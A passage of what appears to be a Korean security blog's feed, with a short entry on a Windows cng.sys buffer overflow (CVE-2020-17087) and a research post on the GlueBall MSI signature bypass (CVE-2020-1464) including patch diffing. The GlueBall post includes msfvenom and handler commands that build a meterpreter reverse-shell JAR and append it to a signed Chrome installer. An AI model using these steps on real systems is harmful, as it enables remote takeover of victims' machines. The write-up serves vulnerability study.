&#xC0AD;&#xC81C;&#xB429;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC791;&#xC131;&#xC790;&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xAD8C;&#xD55C;&#xC758; &#xC258;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xB370;&#xBAA8; &#xC601;&#xC0C1; &#xB610;&#xD55C; &#xACF5;&#xAC1C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file deletion</tag>
      
      <tag>microsoft store</tag>
      
      <tag>symbolic link</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-17087: Windows kernel cng.sys pool-based buffer overflow</title>
    <link href="/2020/11/02/idioth/2020-11-02/"/>
    <url>/2020/11/02/idioth/2020-11-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2104">Windows Kernel cng.sys pool-based buffer overflow in IOCTL 0x390400</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 10 1903(64-bit)</li><li>Maybe since at least Windows 7</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC708;&#xB3C4;&#xC6B0; &#xCEE4;&#xB110; &#xC554;&#xD638;&#xD654; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC778; cng.sys&#xC5D0;&#xC11C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; IOCTL 0x390400 &#xCC98;&#xB9AC; &#xC911; <code>cng!CfgAdtpFormatPropertyBlock</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; 16-bit integer truncation&#xC5D0; &#xC758;&#xD574; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">CONST USHORT DestinationSize = (USHORT)(<span class="hljs-number">6</span> * SourceLength);PWCHAR OutputBuffer = BCryptAlloc(DestinationSize);<span class="hljs-keyword">for</span> (USHORT i = <span class="hljs-number">0</span>; i &lt; SourceLength; i++) {*OutputBuffer++ = <span class="hljs-string">&quot;0123456789abcdef&quot;</span>[*SourceBuffer &gt;&gt; <span class="hljs-number">4</span>];*OutputBuffer++ = <span class="hljs-string">&quot;0123456789abcdef&quot;</span>[*SourceBuffer &amp; <span class="hljs-number">0xF</span>];*OutputBuffer++ = <span class="hljs-string">&apos; &apos;</span>;SourceBuffer++;}</code></pre><p><code>SourceLength</code>&#xC758; &#xAC12;&#xC774; <code>0x2AAB</code>&#xBCF4;&#xB2E4; &#xD06C;&#xAC70;&#xB098; &#xAC19;&#xC73C;&#xBA74; NonPagedPool&#xC5D0; &#xBE44;&#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC791;&#xC740; &#xBC84;&#xD37C;&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xACE0; binary-to-hex &#xBCC0;&#xD658; &#xB8E8;&#xD504;&#xC5D0; &#xC758;&#xD574; &#xC624;&#xBC84; &#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC708;&#xB3C4;&#xC6B0; 10 1903&#xC5D0;&#xC11C; &#xD14C;&#xC2A4;&#xD2B8;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC; &#xC708;&#xB3C4;&#xC6B0; 7&#xBD80;&#xD130; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC608;&#xC0C1;&#xB418;&#xBA70; &#xD604;&#xC7AC; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC545;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>integer overflow</tag>
      
      <tag>idioth</tag>
      
      <tag>ioctl</tag>
      
      <tag>cng.sys</tag>
      
      <tag>buffer overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] CVE-2020-1464: GlueBall</title>
    <link href="/2020/11/01/l0ch/cve-2020-1464/"/>
    <url>/2020/11/01/l0ch/cve-2020-1464/</url>
    
    <content type="html"><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! &#xAE00; &#xC4F0;&#xB294; &#xAC78; &#xBBF8;&#xB8E8;&#xACE0; &#xBBF8;&#xB8E8;&#xB2E4; idioth &#xD300;&#xC7A5;&#xB2D8;&#xC758; &#xAD6C;&#xBC15;&#xC5D0; &#xACA8;&#xC6B0;&#xACA8;&#xC6B0; &#xCCAB; &#xAE00;&#xC744; &#xC4F0;&#xB294; L0ch&#xC785;&#xB2C8;&#xB2E4;. </p><p><del>&#xC545;&#xB355; &#xC0C1;&#xC0AC; &#xC6B0;&#xC6B0; &#xAE38; &#xAC00;&#xB2E4; &#xB808;&#xACE0; &#xBE14;&#xB85D;&#xC774;&#xB098; &#xBC1F;&#xC544;&#xB77C;</del> </p><p>&#xC624;&#xB298;&#xC740; Windows&#xC758; &#xCDE8;&#xC57D;&#xC810; &#xD558;&#xB098;&#xB97C; &#xB4E4;&#xACE0; &#xC654;&#xB294;&#xB370;&#xC694;, &#xD568;&#xAED8; &#xBCF4;&#xC2E4;&#xAE4C;&#xC694;? </p><h1 id="&#xAC1C;&#xC694;"><a href="#&#xAC1C;&#xC694;" class="headerlink" title="&#xAC1C;&#xC694;"></a>&#xAC1C;&#xC694;</h1><p>GlueBall&#xC774;&#xB77C;&#xACE0; &#xBD88;&#xB9AC;&#xB294; CVE-2020-1464&#xB294; 2018&#xB144; 9&#xC6D4;&#xC5D0; &#xC81C;&#xBCF4;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xB9C8;&#xC18C; &#xCE5C;&#xAD6C;&#xB4E4;&#xC774; &#xD328;&#xCE58; &#xC548; &#xD558;&#xACE0; &#xC788;&#xB2E4;&#xAC00; 2&#xB144;&#xC774; &#xC9C0;&#xB09C; &#xCD5C;&#xADFC; patch tuesday&#xB77C;&#xACE0; &#xBD88;&#xB9AC;&#xB294; &#xC815;&#xAE30; &#xD328;&#xCE58;&#xC5D0;&#xC11C; &#xD328;&#xCE58;&#xAC00; &#xB418;&#xC5C8;&#x2026;? &#xC65C; &#xC9C0;&#xAE08; &#xC640;&#xC11C;???</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img1.png" alt></p><p>&#xC774;&#xC0C1;&#xD558;&#xAE34; &#xD558;&#xC9C0;&#xB9CC;&#x2026; &#xB118;&#xC5B4;&#xAC00;&#xB3C4;&#xB85D; &#xD558;&#xACE0; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xD574;&#xD558;&#xB294;&#xB370; &#xD544;&#xC694;&#xD55C; &#xBC30;&#xACBD; &#xC9C0;&#xC2DD;&#xBD80;&#xD130; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD569;&#xC2DC;&#xB2E4;!</p><h1 id="MSI-Microsoft-Installer"><a href="#MSI-Microsoft-Installer" class="headerlink" title="MSI (Microsoft Installer)"></a>MSI (Microsoft Installer)</h1><p>Windows &#xC124;&#xCE58; &#xD328;&#xD0A4;&#xC9C0;<br>&#x2192; Windows&#xC6A9; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; &#xC124;&#xCE58; &#xBC0F; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xBC30;&#xD3EC;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img2.png" alt></p><p>&#xC624;&#xB298;&#xC758; &#xD76C;&#xC0DD;&#xC591;(&#x314E;&#x314E;)&#xC774; &#xB420; &#xC6B0;&#xB9AC; &#xD06C;&#xB86C; &#xC5B4;&#xC11C; &#xC624;&#xACE0;.<br>&#xD06C;&#xB86C;&#xB3C4; MSI&#xB85C; &#xBC30;&#xD3EC;&#xB418;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. malicious &#xD558;&#xAC8C; &#xAFB8;&#xBA70;&#xC904; &#xD14C;&#xB2C8; &#xC870;&#xAE08;&#xB9CC; &#xAE30;&#xB2E4;&#xB9AC;&#xB77C;&#xAD6C;~</p><h1 id="Code-Signing-Certificate-&#xCF54;&#xB4DC;-&#xC11C;&#xBA85;-&#xC778;&#xC99D;&#xC11C;"><a href="#Code-Signing-Certificate-&#xCF54;&#xB4DC;-&#xC11C;&#xBA85;-&#xC778;&#xC99D;&#xC11C;" class="headerlink" title="Code Signing Certificate(&#xCF54;&#xB4DC; &#xC11C;&#xBA85; &#xC778;&#xC99D;&#xC11C;)"></a>Code Signing Certificate(&#xCF54;&#xB4DC; &#xC11C;&#xBA85; &#xC778;&#xC99D;&#xC11C;)</h1><blockquote><p><strong>Code Signing Certificate</strong><br>MS&#xAC00; &#xB3C4;&#xC785;&#xD55C; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xACFC; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC758; &#xB514;&#xC9C0;&#xD138; &#xC11C;&#xBA85; &#xACFC;&#xC815;&#xC73C;&#xB85C;, &#xC774;&#xB7EC;&#xD55C; &#xC778;&#xC99D;&#xC11C;&#xB294; &#xD30C;&#xC77C;&#xC774; &#xC548;&#xC804;&#xD55C; &#xD30C;&#xC77C;&#xC784;&#xC744; &#xC99D;&#xBA85;&#xD574;&#xC900;&#xB2E4;. SmartScreen filter&#xB294; &#xC778;&#xC99D;&#xC11C;&#xC5D0; &#xB300;&#xD55C; &#xC790;&#xCCB4;&#xC801;&#xC778; white list DB&#xB97C; &#xAD00;&#xB9AC;&#xD574; &#xD574;&#xB2F9; &#xC778;&#xC99D;&#xC11C;&#xAC00; &#xC548;&#xC804;&#xD55C;&#xC9C0; &#xC544;&#xB2CC;&#xC9C0;<br>&#xD310;&#xB2E8;&#xD55C;&#xB2E4;. &#xC778;&#xC99D;&#xC11C;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xAC70;&#xB098; &#xD30C;&#xC77C;&#xC774; &#xBCC0;&#xC870;&#xB418;&#xC5B4; &#xC778;&#xC99D;&#xC11C;&#xAC00; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xC2E4;&#xD589;&#xD560; &#xB54C; &#xACBD;&#xACE0;&#xB97C; &#xB744;&#xC6CC;<br>&#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xC54C;&#xB9B0;&#xB2E4;.</p></blockquote><p><img src="/2020/11/01/l0ch/cve-2020-1464/img3.png" alt></p><p>&#xCF54;&#xB4DC; &#xC11C;&#xBA85; &#xC778;&#xC99D;&#xC11C;&#xAC00; &#xB3C4;&#xC785;&#xB418;&#xBA74;&#xC11C;, &#xC778;&#xC99D;&#xC11C;&#xAC00; &#xD655;&#xC778;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD30C;&#xC77C;&#xC758; &#xBB34;&#xBD84;&#xBCC4;&#xD55C; &#xC2E4;&#xD589;&#xC774; &#xC904;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC5EC;&#xAE30;&#xC11C; &#xB05D;&#xB098;&#xBA74; &#xC12D;&#xC12D;&#xD558;&#xC8E0;? &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC778;&#xC99D;&#xC11C;&#xC784;&#xC5D0;&#xB3C4; &#xC778;&#xC99D;&#xC11C; &#xAC80;&#xC99D;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xB294;&#xB370; &#xC774;&#xAC83;&#xC774; &#xC624;&#xB298; &#xC124;&#xBA85;&#xD560; GlueBall&#xC785;&#xB2C8;&#xB2E4;.</p><h1 id="GlueBall-CVE-2020-1464"><a href="#GlueBall-CVE-2020-1464" class="headerlink" title="GlueBall : CVE-2020-1464"></a>GlueBall : CVE-2020-1464</h1><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; MSI &#xD30C;&#xC77C;&#xC758; &#xC778;&#xC99D;&#xC11C; &#xAC80;&#xC99D; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. </p><p>MSI &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74; <code>msisip.dll</code>&#xC758; <code>MsiSIPVerifyIndirectData()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD30C;&#xC77C;&#xC758; &#xC2DC;&#xC791; &#xBD80;&#xBD84;&#xC774; &#xC720;&#xD6A8;&#xD55C; MSI &#xD30C;&#xC77C;&#xC778;&#xC9C0; &#xAC80;&#xC99D;&#xD558;&#xACE0; &#xC11C;&#xBA85;&#xC744; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img4.png" alt></p><p>&#xADF8;&#xB7F0;&#xB370; &#xC774;&#xB54C; &#xD30C;&#xC77C;&#xC758; &#xC0AC;&#xC774;&#xC988;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xC544; MSI &#xD30C;&#xC77C;&#xC758; &#xB4A4;&#xC5D0; &#xC784;&#xC758;&#xC758; &#xB370;&#xC774;&#xD130;&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xC5B4;&#xB3C4; &#xC720;&#xD6A8;&#xD55C; &#xC778;&#xC99D;&#xC11C;&#xB77C;&#xACE0; &#xD310;&#xB2E8;&#xD558;&#xAC8C; &#xB418;&#xACE0;, &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xC778;&#xC99D;&#xC11C; &#xAC80;&#xC99D;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xACE0; malicious &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB3C4;&#xB85D; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="JAR-Java-Archive"><a href="#JAR-Java-Archive" class="headerlink" title="JAR(Java Archive)"></a>JAR(Java Archive)</h2><p><img src="/2020/11/01/l0ch/cve-2020-1464/img5.webp" alt></p><p>JAR&#xC740; &#xC790;&#xBC14; &#xD50C;&#xB7AB;&#xD3FC; &#xBC30;&#xD3EC;&#xB97C; &#xC704;&#xD55C; &#xD328;&#xD0A4;&#xC9C0; &#xD30C;&#xC77C; &#xD3EC;&#xB9F7;&#xC785;&#xB2C8;&#xB2E4;.<br>&#xD2B9;&#xC9D5;&#xC73C;&#xB85C;&#xB294; zip &#xD3EC;&#xB9F7;&#xC73C;&#xB85C; &#xBE4C;&#xB4DC;&#xB418;&#xC5B4; &#xC790;&#xBC14; &#xB7F0;&#xD0C0;&#xC784;&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xB420; &#xB54C; &#xD30C;&#xC77C;&#xC758; &#xB05D;&#xC5D0;&#xC11C;&#xBD80;&#xD130; &#xB85C;&#xB4DC;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#x2192; &#xD30C;&#xC77C; &#xC55E;&#xC5D0; &#xC784;&#xC758;&#xC758; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC788;&#xC5B4;&#xB3C4; &#xC815;&#xC0C1; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC2AC;&#xC2AC; &#xAC10;&#xC774; &#xC62C;&#xB77D; &#xB9D0;&#xB77D; &#xD558;&#xC8E0;??</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>&#xC55E;&#xC11C; &#xB098;&#xC628; &#xCDE8;&#xC57D;&#xC810;&#xACFC; JAR &#xD30C;&#xC77C;&#xC758; &#xD2B9;&#xC131;&#xC744; &#xC870;&#xD569;&#xD558;&#xBA74;..?</p><p><strong>MSI &#xD30C;&#xC77C; &#xB05D;&#xC5D0; &#xC784;&#xC758; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC640;&#xB3C4; &#xC720;&#xD6A8;&#xD55C; &#xC778;&#xC99D;&#xC11C;&#xAC00; &#xB418;&#xB294; &#xCDE8;&#xC57D;&#xC810; + &#xD30C;&#xC77C; &#xC55E;&#xC5D0; &#xC784;&#xC758;&#xC758; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC788;&#xC5B4;&#xB3C4; &#xC815;&#xC0C1; &#xC2E4;&#xD589;&#xB418;&#xB294; jar</strong></p><p>&#xCD95;&#xD558;&#xD569;&#xB2C8;&#xB2E4;! &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xAC00; &#xC644;&#xC131;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xADF8;&#xB9BC;&#xC73C;&#xB85C; &#xC815;&#xB9AC;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img6.png" alt="&#xCD9C;&#xCC98;:https://www.securityinbits.com/malware-analysis/interesting-tactic-by-ratty-adwind-distribution-of-jar-appended-to-signed-msi/"></p><p>&#xB9CC;&#xB2A5; &#xBA54;&#xD0C0;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC73C;&#xB85C; &#xB9AC;&#xBC84;&#xC2A4; &#xC258; malicious &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD574;&#xC11C; &#xC775;&#xC2A4;&#xB97C; &#xD574;&#xBCFC;&#xAC8C;&#xC694;.</p><p>msfvenom&#xC73C;&#xB85C; &#xB9AC;&#xBC84;&#xC2A4; &#xC258;&#xC744; &#xC5EC;&#xB294; jar&#xD3EC;&#xB9F7;&#xC758;  malicious &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs markdown">msfvenom -p java/meterpreter/revserse<span class="hljs-emphasis">_https LHOST=[HOST IP] -f jar -o [filename].jar</span></code></pre><p><img src="/2020/11/01/l0ch/cve-2020-1464/img7.png" alt></p><p>&#xB9AC;&#xC2A4;&#xB108;&#xB3C4; &#xBBF8;&#xB9AC; &#xC5F4;&#xC5B4;&#xB450;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs markdown">handler -p java/meterpreter/reverse<span class="hljs-emphasis">_https -H 0.0.0.0 </span></code></pre><p><img src="/2020/11/01/l0ch/cve-2020-1464/img8.png" alt></p><p>&#xC0DD;&#xC131;&#xB41C; jar &#xD30C;&#xC77C;&#xACFC; &#xD06C;&#xB86C; &#xC124;&#xCE58; msi &#xD30C;&#xC77C;&#xC744; &#xD569;&#xCE69;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xAF2D; msi&#xD30C;&#xC77C; &#xB4A4;&#xC5D0; jar &#xD30C;&#xC77C;&#xC774; &#xC624;&#xB3C4;&#xB85D; &#xC21C;&#xC11C;&#xB97C; &#xC9C0;&#xCF1C;&#xC57C; &#xD55C;&#xB2E4;&#xB294; &#xC810;!</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img9.png" alt></p><p>&#xC774;&#xC81C; &#xC0DD;&#xC131;&#xB41C; exploit.jar &#xC5D0;&#xC11C; &#xC778;&#xC99D;&#xC11C;&#xAC00; &#xC720;&#xD6A8;&#xD55C;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74;</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img10.png" alt></p><p>&#xC694;&#xB807;&#xAC8C; &#xC720;&#xD6A8;&#xD55C; &#xC778;&#xC99D;&#xC11C;&#xB85C; &#xB098;&#xC624;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC2E4;&#xD589;&#xC744; &#xD574;&#xBCF4;&#xBA74; &#xD53C;&#xD574; PC&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xBB34; &#xBC18;&#xC751;&#xB3C4; &#xC5C6;&#xC9C0;&#xB9CC;, &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C;&#xB294; &#xC790;&#xBC14;&#xAC00; &#xB3CC;&#xC544;&#xAC00;&#xACE0; &#xC788;&#xACE0;</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img11.png" alt></p><p>&#xC704; &#xC0AC;&#xC9C4;&#xACFC; &#xAC19;&#xC774; &#xB9AC;&#xBC84;&#xC2A4; &#xC258;&#xC774; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xAC78; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h2 id="Patch-diffing"><a href="#Patch-diffing" class="headerlink" title="Patch diffing"></a>Patch diffing</h2><p>MS&#xB294; &#xC774;&#xC5D0; &#xB300;&#xD55C; &#xD328;&#xCE58;&#xB97C; &#xB0B4;&#xB1A8;&#xB294;&#xB370;&#xC694;, &#xC5B4;&#xB5BB;&#xAC8C; &#xD328;&#xCE58;&#xB97C; &#xD588;&#xB294;&#xC9C0; &#xD328;&#xCE58; &#xC774;&#xD6C4;&#xC758; msisip.dll&#xB97C; &#xAD6C;&#xD574; &#xBE44;&#xAD50;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#x1F4A1;&#xC8FC;&#xC758;! &#xAE00;&#xC4F4;&#xC774;&#xC758; &#xC0BD;&#xC9C8;&#xC774; &#xB2F4;&#xACA8; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></blockquote><p>&#xC54A;&#xC774; &#xADFC;&#xB370;.. &#xC774;&#xAC70; &#xC775;&#xC2A4;&#xD558;&#xACE0; &#xAE00; &#xC880; &#xC4F0;&#xACE0; &#xB514;&#xD551; &#xD558;&#xB824;&#xACE0; &#xBCF4;&#xB2C8;&#xAE4C; &#xADF8;&#xC0C8; &#xC708;&#xB3C4;&#xC6B0;&#xAC00; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xD574;&#xBC84;&#xB838;&#xB124;..?</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img12.jpg" alt></p><p>&#xC544; ** </p><ul><li>&#xC790;&#xB3D9; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC548; &#xB054;</li><li>&#xC2A4;&#xB0C5;&#xC0F7; &#xC548; &#xB9CC;&#xB4E4;&#xC5B4;&#xB193;&#xC74C;</li></ul><p>&#x2192; &#xD328;&#xCE58; &#xC804;&#xC758; msisip.dll &#xBABB; &#xAD6C;&#xD568; &#x2192; ?????????</p><p>&#xC708;&#xB3C4;&#xC6B0; &#xC6D0;&#xB370;&#xC774; &#xBD84;&#xC11D;&#xD560; &#xB550; &#xC790;&#xB3D9; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB294; &#xAF2D; &#xB044;&#xB3C4;&#xB85D; &#xD574;&#xC694;&#x2026;&#x2026;. &#xC544;&#xB2C8;&#xBA74; &#xC2A4;&#xB0C5;&#xC0F7;&#xC774;&#xB77C;&#xB3C4;&#x2026;</p><p>&#xD328;&#xCE58; &#xC804;&#xC758; msisip.dll&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xAD6C;&#xD558;&#xC9C0;? &#xC5B4;&#xB5BB;&#xAC8C; &#xAD6C;&#xD558;&#xAE34; &#xC870;&#xC9C4; &#xAC70;&#xC9C0; &#x314B;&#x314B;</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img13.png" alt></p><p>&#xC5FF;&#xAC19;&#xC740; &#xC790;&#xB3D9; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xB355;&#xBD84;&#xC5D0; &#xB358;&#xC9C8; &#xBED4;&#xD588;&#xC9C0;&#xB9CC;..^^<br>&#xACB0;&#xAD6D; idioth&#xD615; vm&#xC5D0; &#xD328;&#xCE58; &#xC804; &#xD30C;&#xC77C;&#xC774; &#xC788;&#xC5B4;&#xC11C; &#xADF8;&#xAC70; &#xAD6C;&#xAC78;&#xD574;&#xC11C; &#xB514;&#xD551; &#xD574;&#xBC84;&#xB838;&#xC9C0;&#xC694;. &#xD300;&#xC7A5;&#xB2D8; &#xCD5C;&#xACE0; ~<br>&#xB118;&#xACA8;&#xC8FC;&#xB294; &#xB300;&#xC2E0; &#xB9AC;&#xC81C;&#xB85C; &#xC815;&#xC8FC;&#xD589; &#xD558;&#xB77C;&#xB294; &#xD611;&#xBC15;&#xC740; &#xBABB; &#xB4E4;&#xC740; &#xAC78;&#xB85C; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;; </p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img14.png" alt></p><p>&#xD68C;&#xC0C9; &#xB178;&#xB4DC;&#xB294; &#xC0C8;&#xB85C; &#xCD94;&#xAC00;&#xB41C; &#xCF54;&#xB4DC;, &#xB178;&#xB780;&#xC0C9; &#xB178;&#xB4DC;&#xB294; &#xBCC0;&#xACBD;&#xB41C; &#xB178;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img15.png" alt></p><p>&#xD68C;&#xC0C9; &#xB178;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74; <code>MsiSIPVerifyIndirectData()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>NeedFileSizeVerification()</code> &#xACFC; <code>VerifyFileSize()</code> &#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xCD94;&#xAC00;&#xB41C; &#xAC83;&#xC744; &#xBCF4;&#xC544; MSI &#xD30C;&#xC77C;&#xC758; &#xC0AC;&#xC774;&#xC988;&#xB97C; &#xD655;&#xC778;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xCD94;&#xAC00;&#xD574; &#xCDE8;&#xC57D;&#xC810; &#xD328;&#xCE58;&#xB97C; &#xD55C; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;&#xC774;&#xB791; &#xC775;&#xC2A4; &#xD558;&#xB294; &#xAC83;&#xBCF4;&#xB2E4; &#xB514;&#xD551; &#xD558;&#xB294;&#xB370; &#xC2DC;&#xAC04;&#xC744; &#xD6E8;&#xC52C; &#xB9CE;&#xC774; &#xC37C;&#xB124;&#xC694;&#x2026;^^ &#xC774;  &#xACFC;&#xC815;&#xC744; &#xAC1C;&#xC120;&#xD560; &#xC5EC;&#xC9C0;&#xAC00; &#xC788;&#xC744; &#xAC83; &#xAC19;&#xC544; &#xB2E4;&#xC74C; &#xAE00;&#xC740; &#xB514;&#xD551;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xC5F0;&#xAD6C; &#xC8FC;&#xC81C; &#xC77C; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.  &#xC774;&#xAC70; &#xD558;&#xB290;&#xB77C; &#xC708;&#xB3C4;&#xC6B0; vm&#xB9CC; 5&#xAC1C; &#xB9CC;&#xB4E0; &#xAC74; &#xC548; &#xBE44;&#xBC00; ^.^ </p><p>&#xADF8;&#xB7FC; &#xB2E4;&#xC74C; &#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC62C;&#xAC8C;&#xC694; &#xC548;&#xB155;!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>msi</tag>
      
      <tag>L0ch</tag>
      
      <tag>code signing certificate</tag>
      
      <tag>jar</tag>
      
      <tag>glueball</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-15238: Blueman argument injection</title>
    <link href="/2020/10/31/fabu1ous/2020-10-31/"/>
    <url>/2020/10/31/fabu1ous/2020-10-31/</url>
    
